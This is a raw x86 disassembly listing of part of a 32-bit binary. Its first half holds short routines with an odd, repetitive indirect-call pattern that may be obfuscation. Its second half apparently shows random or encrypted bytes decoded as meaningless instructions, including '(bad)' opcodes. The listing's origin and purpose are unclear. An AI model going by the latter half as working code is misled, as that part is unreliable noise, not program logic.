  4019cf:	push   edx
  4019d0:	mov    ebx,0x0
  4019d5:	push   ebx
  4019d6:	push   0x403054
  4019db:	pop    eax
  4019dc:	call   DWORD PTR cs:[eax]
  4019df:	pop    edx
  4019e0:	push   edx
  4019e1:	push   0x0
  4019e3:	push   0x403054
  4019e8:	pop    eax
  4019e9:	call   DWORD PTR cs:[eax]
  4019ec:	pop    edx
  4019ed:	sub    esp,0xffffffd0
  4019f0:	mov    ebp,DWORD PTR [esp]
  4019f3:	add    esp,0x4
  4019f6:	ret    
  4019f7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4019fd:	sub    esp,0x28
  401a00:	push   edx
  401a01:	push   0x403038
  401a06:	pop    eax
  401a07:	call   DWORD PTR cs:[eax]
  401a0a:	pop    edx
  401a0b:	push   edx
  401a0c:	push   DWORD PTR [edx+0x4f0]
  401a12:	push   DWORD PTR [edx+0x47c]
  401a18:	push   esi
  401a19:	call   0x401dcc
  401a1e:	add    esp,0xc
  401a21:	pop    edx
  401a22:	push   edx
  401a23:	mov    eax,0x0
  401a28:	push   eax
  401a29:	push   0x40305c
  401a2e:	pop    eax
  401a2f:	call   DWORD PTR cs:[eax]
  401a32:	pop    edx
  401a33:	sub    esp,0xffffffd8
  401a36:	mov    ebp,DWORD PTR [esp]
  401a39:	add    esp,0x4
  401a3c:	ret    
  401a3d:	add    BYTE PTR [eax],al
  401a3f:	add    BYTE PTR [ebx-0x1374aa01],cl
  401a45:	sub    esp,0x60
  401a48:	push   edx
  401a49:	mov    esi,0x0
  401a4e:	push   esi
  401a4f:	push   0x403034
  401a54:	pop    eax
  401a55:	call   DWORD PTR cs:[eax]
  401a58:	pop    edx
  401a59:	push   edx
  401a5a:	push   esi
  401a5b:	push   esi
  401a5c:	push   ecx
  401a5d:	push   DWORD PTR [edx+0x1bc]
  401a63:	call   0x4019f8
  401a68:	add    esp,0x10
  401a6b:	pop    edx
  401a6c:	push   edx
  401a6d:	mov    esi,0x0
  401a72:	push   esi
  401a73:	push   0x40300c
  401a78:	pop    eax
  401a79:	call   DWORD PTR cs:[eax]
  401a7c:	pop    edx
  401a7d:	sub    esp,0xffffffa0
  401a80:	mov    ebp,DWORD PTR [esp]
  401a83:	add    esp,0x4
  401a86:	ret    
	...
  401a8f:	add    BYTE PTR [ebx-0x1374aa01],cl
  401a95:	sub    esp,0x3c
  401a98:	push   edx
  401a99:	mov    esi,0x0
  401a9e:	push   esi
  401a9f:	push   0x403034
  401aa4:	pop    eax
  401aa5:	call   DWORD PTR cs:[eax]
  401aa8:	pop    edx
  401aa9:	push   edx
  401aaa:	push   esi
  401aab:	push   DWORD PTR [edx+0x408]
  401ab1:	call   0x4013c4
  401ab6:	add    esp,0x8
  401ab9:	pop    edx
  401aba:	push   edx
  401abb:	mov    esi,0x0
  401ac0:	push   esi
  401ac1:	push   0x40301c
  401ac6:	pop    eax
  401ac7:	call   DWORD PTR cs:[eax]
  401aca:	pop    edx
  401acb:	sub    esp,0xffffffc4
  401ace:	mov    ebp,DWORD PTR [esp]
  401ad1:	add    esp,0x4
  401ad4:	ret    
  401ad5:	add    BYTE PTR [eax],al
  401ad7:	add    BYTE PTR [eax],al
  401ad9:	add    BYTE PTR [eax],al
  401adb:	add    BYTE PTR [ebx-0x1374aa01],cl
  401ae1:	sub    esp,0x50
  401ae4:	push   edx
  401ae5:	push   DWORD PTR [edx+0x3dc]
  401aeb:	push   DWORD PTR [edx+0x128]
  401af1:	call   0x4018e4
  401af6:	add    esp,0x8
  401af9:	pop    edx
  401afa:	push   edx
  401afb:	push   0x0
  401afd:	push   0x40302c
  401b02:	pop    eax
  401b03:	call   DWORD PTR cs:[eax]
  401b06:	pop    edx
  401b07:	push   edx
  401b08:	lea    eax,[edx]
  401b0a:	push   eax
  401b0b:	push   0x403024
  401b10:	pop    eax
  401b11:	call   DWORD PTR cs:[eax]
  401b14:	test   eax,eax
  401b16:	jne    0x401b08
  401b18:	pop    edx
  401b19:	sub    esp,0xffffffb0
  401b1c:	mov    ebp,DWORD PTR [esp]
  401b1f:	add    esp,0x4
  401b22:	ret    
  401b23:	add    BYTE PTR [eax],al
  401b25:	add    BYTE PTR [eax],al
  401b27:	add    BYTE PTR [ebx-0x1374aa01],cl
  401b2d:	sub    esp,0x40
  401b30:	push   edx
  401b31:	push   0x403038
  401b36:	pop    eax
  401b37:	call   DWORD PTR cs:[eax]
  401b3a:	pop    edx
  401b3b:	push   edx
  401b3c:	push   DWORD PTR [edx+0x3e4]
  401b42:	push   DWORD PTR [edx+0x1ac]
  401b48:	push   ebx
  401b49:	push   ecx
  401b4a:	call   0x401e58
  401b4f:	add    esp,0x10
  401b52:	pop    edx
  401b53:	push   edx
  401b54:	push   0x0
  401b56:	push   0x403004
  401b5b:	pop    eax
  401b5c:	call   DWORD PTR cs:[eax]
  401b5f:	pop    edx
  401b60:	sub    esp,0xffffffc0
  401b63:	mov    ebp,DWORD PTR [esp]
  401b66:	add    esp,0x4
  401b69:	ret    
  401b6a:	add    BYTE PTR [eax],al
  401b6c:	add    BYTE PTR [eax],al
  401b6e:	add    BYTE PTR [eax],al
  401b70:	mov    edi,edi
  401b72:	push   ebp
  401b73:	mov    ebp,esp
  401b75:	sub    esp,0x50
  401b78:	push   edx
  401b79:	push   0x403038
  401b7e:	pop    eax
  401b7f:	call   DWORD PTR cs:[eax]
  401b82:	pop    edx
  401b83:	push   edx
  401b84:	push   DWORD PTR [edx+0x5e8]
  401b8a:	push   edi
  401b8b:	push   DWORD PTR [edx+0x160]
  401b91:	call   0x40172c
  401b96:	add    esp,0xc
  401b99:	pop    edx
  401b9a:	push   edx
  401b9b:	push   0x0
  401b9d:	push   0x403020
  401ba2:	pop    eax
  401ba3:	call   DWORD PTR cs:[eax]
  401ba6:	pop    edx
  401ba7:	sub    esp,0xffffffb0
  401baa:	mov    ebp,DWORD PTR [esp]
  401bad:	add    esp,0x4
  401bb0:	ret    
  401bb1:	add    BYTE PTR [eax],al
  401bb3:	add    BYTE PTR [ebx-0x1374aa01],cl
  401bb9:	sub    esp,0x40
  401bbc:	push   edx
  401bbd:	push   ecx
  401bbe:	push   DWORD PTR [edx+0x11c]
  401bc4:	push   eax
  401bc5:	call   0x4012c4
  401bca:	add    esp,0xc
  401bcd:	pop    edx
  401bce:	push   edx
  401bcf:	push   0x0
  401bd1:	push   0x403080
  401bd6:	pop    eax
  401bd7:	call   DWORD PTR cs:[eax]
  401bda:	pop    edx
  401bdb:	push   edx
  401bdc:	mov    edx,0x0
  401be1:	push   edx
  401be2:	push   0x40305c
  401be7:	pop    eax
  401be8:	call   DWORD PTR cs:[eax]
  401beb:	pop    edx
  401bec:	sub    esp,0xffffffc0
  401bef:	mov    ebp,DWORD PTR [esp]
  401bf2:	add    esp,0x4
  401bf5:	ret    
  401bf6:	add    BYTE PTR [eax],al
  401bf8:	add    BYTE PTR [eax],al
  401bfa:	add    BYTE PTR [eax],al
  401bfc:	mov    edi,edi
  401bfe:	push   ebp
  401bff:	mov    ebp,esp
  401c01:	sub    esp,0x28
  401c04:	push   edx
  401c05:	push   DWORD PTR [edx+0xc8]
  401c0b:	push   DWORD PTR [edx+0x290]
  401c11:	push   eax
  401c12:	call   0x401c9c
  401c17:	add    esp,0xc
  401c1a:	pop    edx
  401c1b:	push   edx
  401c1c:	mov    ecx,0x0
  401c21:	push   ecx
  401c22:	push   0x403004
  401c27:	pop    eax
  401c28:	call   DWORD PTR cs:[eax]
  401c2b:	pop    edx
  401c2c:	push   edx
  401c2d:	mov    ecx,0x0
  401c32:	push   ecx
  401c33:	push   0x403034
  401c38:	pop    eax
  401c39:	call   DWORD PTR cs:[eax]
  401c3c:	pop    edx
  401c3d:	sub    esp,0xffffffd8
  401c40:	mov    ebp,DWORD PTR [esp]
  401c43:	add    esp,0x4
  401c46:	ret    
	...
  401c57:	add    BYTE PTR [ebx-0x1374aa01],cl
  401c5d:	sub    esp,0x2c
  401c60:	push   edx
  401c61:	push   eax
  401c62:	push   DWORD PTR [edx+0x498]
  401c68:	push   eax
  401c69:	call   0x401698
  401c6e:	add    esp,0xc
  401c71:	pop    edx
  401c72:	push   edx
  401c73:	mov    eax,0x0
  401c78:	push   eax
  401c79:	push   0x403034
  401c7e:	pop    eax
  401c7f:	call   DWORD PTR cs:[eax]
  401c82:	pop    edx
  401c83:	push   edx
  401c84:	push   0x403044
  401c89:	pop    eax
  401c8a:	call   DWORD PTR cs:[eax]
  401c8d:	pop    edx
  401c8e:	sub    esp,0xffffffd4
  401c91:	mov    ebp,DWORD PTR [esp]
  401c94:	add    esp,0x4
  401c97:	ret    
  401c98:	add    BYTE PTR [eax],al
  401c9a:	add    BYTE PTR [eax],al
  401c9c:	mov    edi,edi
  401c9e:	push   ebp
  401c9f:	mov    ebp,esp
  401ca1:	sub    esp,0x30
  401ca4:	push   edx
  401ca5:	push   0x0
  401ca7:	push   0x40300c
  401cac:	pop    eax
  401cad:	call   DWORD PTR cs:[eax]
  401cb0:	pop    edx
  401cb1:	push   edx
  401cb2:	push   DWORD PTR [edx+0x5a0]
  401cb8:	push   DWORD PTR [edx+0x33c]
  401cbe:	push   DWORD PTR [edx+0xcc]
  401cc4:	call   0x40189c
  401cc9:	add    esp,0xc
  401ccc:	pop    edx
  401ccd:	push   edx
  401cce:	mov    ebx,0x0
  401cd3:	push   ebx
  401cd4:	push   0x40301c
  401cd9:	pop    eax
  401cda:	call   DWORD PTR cs:[eax]
  401cdd:	pop    edx
  401cde:	sub    esp,0xffffffd0
  401ce1:	mov    ebp,DWORD PTR [esp]
  401ce4:	add    esp,0x4
  401ce7:	ret    
  401ce8:	mov    edi,edi
  401cea:	push   ebp
  401ceb:	mov    ebp,esp
  401ced:	sub    esp,0x2c
  401cf0:	push   edx
  401cf1:	lea    edx,[edx]
  401cf3:	push   edx
  401cf4:	push   0x403024
  401cf9:	pop    eax
  401cfa:	call   DWORD PTR cs:[eax]
  401cfd:	test   eax,eax
  401cff:	jne    0x401cf1
  401d01:	pop    edx
  401d02:	push   edx
  401d03:	push   esi
  401d04:	push   DWORD PTR [edx+0x55c]
  401d0a:	push   ebx
  401d0b:	push   DWORD PTR [edx+0x39c]
  401d11:	call   0x40122c
  401d16:	add    esp,0x10
  401d19:	pop    edx
  401d1a:	push   edx
  401d1b:	push   0x0
  401d1d:	push   0x403080
  401d22:	pop    eax
  401d23:	call   DWORD PTR cs:[eax]
  401d26:	pop    edx
  401d27:	sub    esp,0xffffffd4
  401d2a:	mov    ebp,DWORD PTR [esp]
  401d2d:	add    esp,0x4
  401d30:	ret    
  401d31:	add    BYTE PTR [eax],al
  401d33:	add    BYTE PTR [eax],al
  401d35:	add    BYTE PTR [eax],al
  401d37:	add    BYTE PTR [ebx-0x1374aa01],cl
  401d3d:	sub    esp,0x40
  401d40:	push   edx
  401d41:	mov    ecx,0x0
  401d46:	push   ecx
  401d47:	push   0x403054
  401d4c:	pop    eax
  401d4d:	call   DWORD PTR cs:[eax]
  401d50:	pop    edx
  401d51:	push   edx
  401d52:	push   DWORD PTR [edx+0x264]
  401d58:	push   DWORD PTR [edx+0x100]
  401d5e:	call   0x401104
  401d63:	add    esp,0x8
  401d66:	pop    edx
  401d67:	push   edx
  401d68:	mov    ecx,0x0
  401d6d:	push   ecx
  401d6e:	push   0x403014
  401d73:	pop    eax
  401d74:	call   DWORD PTR cs:[eax]
  401d77:	pop    edx
  401d78:	sub    esp,0xffffffc0
  401d7b:	mov    ebp,DWORD PTR [esp]
  401d7e:	add    esp,0x4
  401d81:	ret    
  401d82:	add    BYTE PTR [eax],al
  401d84:	mov    edi,edi
  401d86:	push   ebp
  401d87:	mov    ebp,esp
  401d89:	sub    esp,0x28
  401d8c:	push   edx
  401d8d:	push   DWORD PTR [edx+0xbc]
  401d93:	push   DWORD PTR [edx+0x5e8]
  401d99:	call   0x4017b8
  401d9e:	add    esp,0x8
  401da1:	pop    edx
  401da2:	push   edx
  401da3:	mov    esi,0x0
  401da8:	push   esi
  401da9:	push   0x403080
  401dae:	pop    eax
  401daf:	call   DWORD PTR cs:[eax]
  401db2:	pop    edx
  401db3:	push   edx
  401db4:	push   0x0
  401db6:	push   0x403080
  401dbb:	pop    eax
  401dbc:	call   DWORD PTR cs:[eax]
  401dbf:	pop    edx
  401dc0:	sub    esp,0xffffffd8
  401dc3:	mov    ebp,DWORD PTR [esp]
  401dc6:	add    esp,0x4
  401dc9:	ret    
  401dca:	add    BYTE PTR [eax],al
  401dcc:	mov    edi,edi
  401dce:	push   ebp
  401dcf:	mov    ebp,esp
  401dd1:	sub    esp,0x4c
  401dd4:	push   edx
  401dd5:	push   ebx
  401dd6:	push   DWORD PTR [edx+0xd4]
  401ddc:	call   0x401b28
  401de1:	add    esp,0x8
  401de4:	pop    edx
  401de5:	push   edx
  401de6:	push   0x0
  401de8:	push   0x40300c
  401ded:	pop    eax
  401dee:	call   DWORD PTR cs:[eax]
  401df1:	pop    edx
  401df2:	push   edx
  401df3:	mov    ecx,0x0
  401df8:	push   ecx
  401df9:	push   0x403010
  401dfe:	pop    eax
  401dff:	call   DWORD PTR cs:[eax]
  401e02:	pop    edx
  401e03:	sub    esp,0xffffffb4
  401e06:	mov    ebp,DWORD PTR [esp]
  401e09:	add    esp,0x4
  401e0c:	ret    
  401e0d:	add    BYTE PTR [eax],al
  401e0f:	add    BYTE PTR [eax],al
  401e11:	add    BYTE PTR [eax],al
  401e13:	add    BYTE PTR [ebx-0x1374aa01],cl
  401e19:	sub    esp,0x44
  401e1c:	push   edx
  401e1d:	push   eax
  401e1e:	push   DWORD PTR [edx+0x510]
  401e24:	call   0x401bb4
  401e29:	add    esp,0x8
  401e2c:	pop    edx
  401e2d:	push   edx
  401e2e:	push   0x0
  401e30:	push   0x40301c
  401e35:	pop    eax
  401e36:	call   DWORD PTR cs:[eax]
  401e39:	pop    edx
  401e3a:	push   edx
  401e3b:	mov    edi,0x0
  401e40:	push   edi
  401e41:	push   0x403054
  401e46:	pop    eax
  401e47:	call   DWORD PTR cs:[eax]
  401e4a:	pop    edx
  401e4b:	sub    esp,0xffffffbc
  401e4e:	mov    ebp,DWORD PTR [esp]
  401e51:	add    esp,0x4
  401e54:	ret    
  401e55:	add    BYTE PTR [eax],al
  401e57:	add    BYTE PTR [ebx-0x1374aa01],cl
  401e5d:	sub    esp,0x28
  401e60:	push   edx
  401e61:	push   ecx
  401e62:	push   DWORD PTR [edx+0x384]
  401e68:	push   edi
  401e69:	call   0x4014b8
  401e6e:	add    esp,0xc
  401e71:	pop    edx
  401e72:	push   edx
  401e73:	push   0x403044
  401e78:	pop    eax
  401e79:	call   DWORD PTR cs:[eax]
  401e7c:	pop    edx
  401e7d:	push   edx
  401e7e:	push   0x403038
  401e83:	pop    eax
  401e84:	call   DWORD PTR cs:[eax]
  401e87:	pop    edx
  401e88:	sub    esp,0xffffffd8
  401e8b:	mov    ebp,DWORD PTR [esp]
  401e8e:	add    esp,0x4
  401e91:	ret    
	...
  401e9a:	add    BYTE PTR [eax],al
  401e9c:	sti    
  401e9d:	scas   eax,DWORD PTR es:[edi]
  401e9e:	retf   
  401e9f:	les    esi,FWORD PTR [ebp+0x74]
  401ea2:	inc    eax
  401ea3:	fld    TBYTE PTR cs:[esi+0x30d5f51]
  401eaa:	or     ecx,edi
  401eac:	imul   ebp,edi,0x43
  401eaf:	mov    bh,0x58
  401eb1:	ss retf 
  401eb3:	mov    edi,0xfdc80f58
  401eb8:	out    dx,eax
  401eb9:	sahf   
  401eba:	mov    ecx,0xc7c70097
  401ebf:	add    DWORD PTR [eax],eax
  401ec1:	mov    edi,0xc6e30001
  401ec7:	jg     0x401f0a
  401ec9:	retf   0xa27e
  401ecc:	mov    ebp,0x310580a8
  401ed1:	imul   esi,eax,0xffffffe2
  401ed4:	add    DWORD PTR ds:0x251691a3,ecx
  401eda:	gs ins BYTE PTR es:[edi],dx
  401edc:	pop    eax
  401edd:	push   edi
  401ede:	inc    eax
  401edf:	push   ss
  401ee0:	or     DWORD PTR [edx+0x32],eax
  401ee3:	imul   ecx,DWORD PTR [ecx],0xffffffff
  401ee6:	mov    edx,0xbcd552e7
  401eeb:	ins    BYTE PTR es:[edi],dx
  401eec:	mov    esi,0x81d8533b
  401ef1:	push   esp
  401ef2:	js     0x401eeb
  401ef4:	pop    edx
  401ef5:	call   0xf444a4ea
  401efa:	mov    ch,0xa0
  401efc:	jge    0x401ee2
  401efe:	adc    BYTE PTR [eax],al
  401f00:	add    DWORD PTR [eax],edx
  401f02:	adc    al,0x1d
  401f04:	sbb    ebp,DWORD PTR [edi+0x468a0000]
  401f0a:	(bad)  
  401f0b:	adc    BYTE PTR [esi+edx*4],dl
  401f0e:	and    eax,0x60f2ae1
  401f13:	call   0x3110:0x20092406
  401f1a:	sbb    edx,DWORD PTR [edi+0x76dd5ba9]
  401f20:	ins    DWORD PTR es:[edi],dx
  401f21:	mov    DWORD PTR [eax+0x13],esp
  401f24:	xor    eax,0x2102650d
  401f29:	add    BYTE PTR [edx+eax*1],al
  401f2c:	and    eax,0x5c1d9a32
  401f31:	jbe    0x401f48
  401f33:	push   eax
  401f34:	add    BYTE PTR [edx+0x702b6291],0xc4
  401f3b:	xchg   ebx,eax
  401f3c:	adc    DWORD PTR [eax],eax
  401f3e:	add    al,ah
  401f40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f41:	push   0xff6b6a00
  401f46:	push   ebp
  401f47:	push   ss
  401f48:	pushf  
  401f49:	lods   eax,DWORD PTR ds:[esi]
  401f4a:	cli    
  401f4b:	cdq    
  401f4c:	cwde   
  401f4d:	add    eax,0xb5dedbf8
  401f52:	aam    0xf9
  401f54:	stc    
  401f55:	aam    0xf
  401f57:	sub    eax,0xcffb9a7
  401f5c:	push   esi
  401f5d:	ret    
  401f5e:	call   0xc428acf0
  401f63:	stc    
  401f64:	add    al,BYTE PTR [edi-0x238cdecc]
  401f6a:	jl     0x401fc6
  401f6c:	add    eax,0x3f6f00fb
  401f71:	call   0x6ab2aa76
  401f76:	add    BYTE PTR [edi+0x6b],ch
  401f79:	call   FWORD PTR [edi]
  401f7b:	pushf  
  401f7c:	cmp    al,0x8a
  401f7e:	stos   BYTE PTR es:[edi],al
  401f7f:	sub    BYTE PTR [eax+ebx*1+0x3c6b3d97],ah
  401f86:	adc    eax,0x47cca74
  401f8b:	push   ecx
  401f8c:	push   es
  401f8d:	pop    es
  401f8e:	(bad)  [ecx+0x78]
  401f91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f92:	add    BYTE PTR [ecx-0x364fb057],ch
  401f98:	loope  0x401f82
  401f9a:	sbb    dh,bl
  401f9c:	int3   
  401f9d:	cmp    al,0x8d
  401f9f:	pop    es
  401fa0:	add    ebp,ebx
  401fa2:	retf   
  401fa3:	push   es
  401fa4:	push   edi
  401fa5:	test   DWORD PTR [esi+0x73],0x22581962
  401fac:	inc    ecx
  401fad:	dec    ecx
  401fae:	mov    dl,0x4e
  401fb0:	ins    DWORD PTR es:[edi],dx
  401fb1:	loope  0x401fc8
  401fb3:	sbb    al,0x69
  401fb5:	xor    al,0x6a
  401fb7:	xor    al,0x0
  401fb9:	jno    0x40201b
  401fbb:	push   ebx
  401fbc:	push   ebx
  401fbd:	push   es
  401fbe:	pusha  
  401fbf:	je     0x401fb6
  401fc1:	jl     0x401fc8
  401fc3:	stos   DWORD PTR es:[edi],eax
  401fc4:	aas    
  401fc5:	push   esp
  401fc6:	cmp    ebp,DWORD PTR [esi]
  401fc8:	push   ebx
  401fc9:	add    DWORD PTR [eax],ecx
  401fcb:	ds aas 
  401fcd:	push   cs
  401fce:	add    ch,BYTE PTR [esp+eax*1+0x77e1cddc]
  401fd5:	cmp    al,0x2f
  401fd7:	or     BYTE PTR [esi-0xe],bl
  401fda:	jmp    DWORD PTR [ebx-0x49a93d2c]
  401fe0:	je     0x401f70
  401fe2:	mov    bh,0x93
  401fe4:	xchg   esp,eax
  401fe5:	lods   eax,DWORD PTR cs:[esi]
  401fe7:	xor    esi,DWORD PTR [edi-0x577bc9f]
  401fed:	sbb    esi,esi
  401fef:	dec    BYTE PTR [esi-0x29]
  401ff2:	test   BYTE PTR [edi+0x72a00e52],bh
  401ff8:	ss dec ebx
  401ffa:	ret    0x8e1c
  401ffd:	xchg   edi,edi
  401fff:	jnp    0x401fd4
  402001:	out    0xc4,eax
  402003:	test   DWORD PTR [ecx],eax
  402005:	(bad)  
  402006:	pop    ebx
  402007:	arpl   bx,ax
  402009:	in     al,dx
  40200a:	arpl   WORD PTR [ebp+0x76],si
  40200d:	call   0x14bb6436
  402012:	push   DWORD PTR [ebp+0x66]
  402015:	je     0x402082
  402017:	jnp    0x402021
  402019:	test   al,dl
  40201b:	inc    eax
  40201c:	fmul   QWORD PTR [edi+0x50253a9]
  402022:	test   ecx,ebx
  402024:	cmp    DWORD PTR [ebp+0x6],edx
  402027:	push   es
  402028:	push   edi
  402029:	pop    es
  40202a:	or     BYTE PTR [ebx],dh
  40202c:	ins    DWORD PTR es:[edi],dx
  40202d:	int3   
  40202e:	add    cl,BYTE PTR [eax+ebx*2]
  402031:	or     BYTE PTR [ebx-0x8],cl
  402034:	aas    
  402035:	das    
  402036:	mov    al,ds:0xc5a758ff
  40203b:	jo     0x402088
  40203d:	dec    ecx
  40203e:	mov    edx,0x29e958bd
  402043:	mov    DWORD PTR [ecx],0x1e88ae9
  402049:	xor    DWORD PTR [eax+0x186968],0x28760000
  402053:	push   esi
  402054:	ficom  DWORD PTR [ebx-0x78e6f002]
  40205a:	dec    DWORD PTR [ebx-0x220c9fff]
  402060:	add    al,0xff
  402062:	add    BYTE PTR fs:[ecx-0x75],bl
  402066:	inc    eax
  402067:	cmp    al,0x80
  402069:	add    BYTE PTR [edi+0x34146061],al
  40206f:	(bad)
  402073:	scas   eax,DWORD PTR es:[edi]
  402074:	jnp    0x40205d
  402076:	and    al,0x88
  402078:	dec    ecx
  402079:	sbb    BYTE PTR [edi-0x3477a706],al
  40207f:	shl    al,0xef
  402082:	mov    bl,BYTE PTR [eax+0x6d]
  402085:	out    dx,eax
  402086:	out    dx,eax
  402087:	cmp    DWORD PTR [esi-0x9],edx
  40208a:	inc    esi
  40208b:	imul   edi,DWORD PTR [eax+0x44],0xa1190ea1
  402092:	fs xchg edx,ecx
  402095:	xor    BYTE PTR [ecx+0x65767178],cl
  40209b:	push   esp
  40209c:	std    
  40209d:	jbe    0x40209c
  40209f:	or     BYTE PTR [ecx],al
  4020a1:	pop    edi
  4020a2:	jmp    0x7e1c:0x79bdd2b0
  4020a9:	je     0x402047
  4020ab:	mov    dh,0x3a
  4020ad:	call   0x791a5a02
  4020b2:	pop    eax
  4020b3:	add    al,0x3
  4020b5:	pop    eax
  4020b6:	js     0x4020ac
  4020b8:	mov    eax,DWORD PTR gs:[esi+eiz*1]
  4020bc:	in     al,dx
  4020bd:	add    BYTE PTR [edi+0x424010f],ch
  4020c3:	cmp    BYTE PTR [edx+0x64500424],cl
  4020c9:	(bad)  
  4020ca:	out    0x14,eax
  4020cc:	in     al,dx
  4020cd:	xor    bl,al
  4020cf:	inc    ebp
  4020d0:	dec    ebx
  4020d1:	mov    BYTE PTR [ebp+0xb],al
  4020d4:	xor    DWORD PTR [esi+0x7472b98b],0xf8f70373
  4020de:	or     bh,dl
  4020e0:	mov    al,BYTE PTR [ecx-0x70916601]
  4020e6:	test   al,0x7a
  4020e8:	test   eax,0xb6c37e53
  4020ed:	adc    DWORD PTR [ebx-0x56],0x235457a9
  4020f4:	fisub  DWORD PTR [esi]
  4020f6:	adc    BYTE PTR [esi-0x9],dl
  4020f9:	fwait
  4020fa:	mov    BYTE PTR [esi],ah
  4020fc:	sub    edi,DWORD PTR [esi]
  4020fe:	dec    BYTE PTR [eax]
  402100:	xlat   BYTE PTR ds:[ebx]
  402101:	or     BYTE PTR [ebx+0x4b],0x91
  402105:	fisub  DWORD PTR [edi+0x543f7f]
  40210b:	or     DWORD PTR [edi+0x7],edx
  40210e:	or     BYTE PTR [edx+ebx*8],bh
  402111:	or     dl,al
  402113:	aas    
  402114:	push   ecx
  402115:	adc    eax,0x657cd8d
  40211a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40211b:	xchg   ebx,eax
  40211c:	pop    ebx
  40211d:	cdq    
  40211e:	or     al,dl
  402120:	mov    ch,0x9e
  402122:	add    al,0x57
  402124:	add    DWORD PTR [ecx+0xd70019b],ebp
  40212a:	inc    esp
  40212b:	add    eax,DWORD PTR [eax]
  40212d:	popa   
  40212e:	jb     0x40212b
  402130:	(bad)  
  402131:	jg     0x4021a8
  402133:	std    
  402134:	mov    dh,BYTE PTR [ebx+ebp*2+0x0]
  402138:	test   eax,0xa9f8f1c
  40213d:	hlt    
  40213e:	push   esi
  40213f:	or     eax,0xb10f0a02
  402144:	or     DWORD PTR [edi-0x29aaaaff],ebp
  40214a:	cmp    DWORD PTR [ebx-0x8],eax
  40214d:	dec    ecx
  40214e:	loop   0x4020eb
  402150:	mov    ds:0x78605cea,al
  402155:	sar    ch,1
  402157:	pop    esp
  402158:	adc    BYTE PTR [eax],ah
  40215a:	aaa    
  40215b:	ja     0x4021b3
  40215d:	cmp    edx,edx
  40215f:	mov    esi,0x590f8494
  402164:	add    al,0xa4
  402166:	add    BYTE PTR [eax],al
  402168:	add    DWORD PTR [ebx-0x495ed1ee],ecx
  40216e:	mov    eax,DWORD PTR [ebp-0x7e7bf08e]
  402174:	add    BYTE PTR [edi+ecx*1-0x7452080b],0xf8
  40217c:	cld    
  40217d:	jo     0x40217c
  40217f:	js     0x4021cf
  402181:	add    BYTE PTR [edx+0x543b0351],ch
  402187:	lods   al,BYTE PTR ds:[esi]
  402188:	imul   edx,DWORD PTR [edx+ebp*2],0xf8835850
  40218f:	add    al,0x55
  402191:	add    BYTE PTR [edi+0x6a14693f],0x50
  402198:	pop    eax
  402199:	adc    DWORD PTR [esp],0x57811425
  4021a0:	add    BYTE PTR [esi+0x1c],dl
  4021a3:	jmp    FWORD PTR [ecx-0x859f100]
  4021a9:	jno    0x40216f
  4021ab:	add    al,0xdd
  4021ad:	add    dl,bh
  4021af:	inc    esp
  4021b0:	ins    DWORD PTR es:[edi],dx
  4021b1:	cmp    ah,cl
  4021b3:	mov    eax,0xe54462f2
  4021b8:	int3   
  4021b9:	lods   eax,DWORD PTR ds:[esi]
  4021ba:	push   esi
  4021bb:	mov    ah,0x7d
  4021bd:	adc    eax,0xff0ea6ff
  4021c2:	and    al,0x1c
  4021c4:	sbb    al,0xe3
  4021c6:	out    dx,al
  4021c7:	pop    ecx
  4021c8:	xlat   BYTE PTR ds:[ebx]
  4021c9:	stos   BYTE PTR es:[edi],al
  4021ca:	mov    BYTE PTR [ebx],0x56
  4021cd:	jbe    0x4021e3
  4021cf:	jb     0x40219f
  4021d1:	cmp    BYTE PTR [edx+0x41],dl
  4021d4:	adc    DWORD PTR [eax],eax
  4021d6:	aas    
  4021d7:	mov    bl,0x6a
  4021d9:	push   ebx
  4021da:	push   eax
  4021db:	dec    esi
  4021dd:	cmp    BYTE PTR [eax+edi*8],al
  4021e0:	adc    DWORD PTR [eax],eax
  4021e2:	aas    
  4021e3:	mov    cl,0x84
  4021e5:	jae    0x4021e7
  4021e7:	adc    BYTE PTR [ecx],dl
  4021e9:	add    bl,bl
  4021eb:	push   ecx
  4021ec:	pop    eax
  4021ed:	add    BYTE PTR [ebp+0xc],dl
  4021f0:	push   edi
  4021f1:	or     al,0xa7
  4021f3:	push   esp
  4021f4:	ficom  WORD PTR [ecx-0x491c24d4]
  4021fa:	test   eax,0x21cde36e
  4021ff:	pushf  
  402200:	jae    0x4021d8
  402202:	scas   al,BYTE PTR es:[edi]
  402203:	les    ecx,FWORD PTR [edi-0x15]
  402206:	mov    edi,0xe89b497e
  40220b:	mov    eax,DWORD PTR [ecx]
  40220d:	call   0xec3f690d
  402212:	push   edx
  402213:	pop    ds
  402214:	push   ds
  402215:	mov    ecx,0xff0a17ff
  40221a:	(bad)  
  40221b:	jmp    FWORD PTR [eax+0x1e1f846]
  402221:	pop    es
  402222:	push   ecx
  402223:	adc    dh,0xe8
  402226:	add    BYTE PTR [edx+ebx*2-0x6124348c],cl
  40222d:	cmp    eax,0xe801d08b
  402232:	into   
  402233:	inc    esi
  402234:	inc    edi
  402236:	fs (bad) 
  402238:	jb     0x40227b
  40223a:	pop    ss
  40223b:	inc    ecx
  40223c:	mov    esi,0xf2bfcae8
  402241:	scas   eax,DWORD PTR es:[edi]
  402242:	ds aaa 
  402244:	rol    BYTE PTR [eax],0x54
  402247:	in     al,0x2a
  402249:	add    eax,0x808923c5
  40224e:	sar    DWORD PTR [eax-0x79],0x98
  402252:	cvtdq2ps xmm1,xmm3
  402255:	dec    esi
  402256:	sub    al,0xf2
  402258:	dec    eax
  402259:	add    DWORD PTR [eax],ebx
  40225b:	mov    al,0xbe
  40225d:	stc    
  40225e:	int3   
  40225f:	inc    eax
  402260:	or     edi,DWORD PTR [ecx-0x8123dc]
  402266:	(bad)  
  402267:	(bad)  
  402268:	out    dx,eax
  402269:	dec    eax
  40226a:	repz ret 
  40226c:	or     DWORD PTR [ebp+0xe],ebx
  40226f:	pop    es
  402270:	or     DWORD PTR [ecx-0x9149af],edi
  402276:	(bad)  
  402277:	jmp    DWORD PTR [ebp-0x857fe9]
  40227d:	jg     0x4022e1
  40227f:	sub    eax,0x3c9e9551
  402284:	xchg   ecx,eax
  402285:	mov    al,ds:0xc8a739f4
  40228a:	rcl    DWORD PTR [ecx+0x1],0x48
  40228e:	push   esp
  40228f:	mov    DWORD PTR [edx+0x1004876],ecx
  402295:	dec    eax
  402296:	jbe    0x402229
  402298:	xchg   edx,eax
